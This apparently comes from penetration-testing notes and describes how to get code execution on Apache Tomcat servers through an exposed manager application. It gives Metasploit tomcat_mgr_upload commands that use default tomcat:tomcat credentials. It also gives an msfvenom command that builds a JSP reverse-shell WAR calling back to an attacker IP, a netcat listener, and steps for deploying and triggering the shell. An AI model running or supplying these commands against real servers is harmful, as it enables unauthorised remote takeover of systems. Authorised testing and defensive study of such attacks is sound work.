`Tomcat exploits <https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/>`_
******************************************************************************************************

Tomcat Manager Authenticated Upload Code Execution
#########################################################

This module can be used to execute a payload on Apache Tomcat servers that have an exposed “manager” application. The payload is uploaded as a WAR archive containing a JSP application using a POST request against the /manager/html/upload component. **NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads.**

.. code-block:: console

    use exploit/multi/http/tomcat_mgr_upload
    msf exploit(multi/http/tomcat_mgr_upload) > set rhost 192.168.1.101
    msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
    msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
    msf exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
    msf exploit(multi/http/tomcat_mgr_upload) > exploit`

Generate .war Format Backdoor
####################################

We can use msfvenom for generating a .war format backdoor for java/jsp payload, all you need to do is just follow the given below syntax to create a .war format file and then run Netcat listener

.. code-block:: console

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f war > shell.war
    nc -lvp <attacker port from above command>

You then upload it to the manager under the section WAR file to deploy, and then click deploy.

Now login to tomcat manager application using tomcat: tomcat as username: password. You will be welcomed by the admin dashboard where you can upload a .war file. 

As you can observe I had browser the malicious shell.war file to be deployed as highlighted in the image. As soon as you will upload your file, you will see the /path entry for your file in the table of Applications

To execute your .war file, you have to click on the /.war file path mention in the Application table. Or you can directly explore http://target_IP:port/file_name.

As soon as you will execute your file you will get the reverse connection through netcat.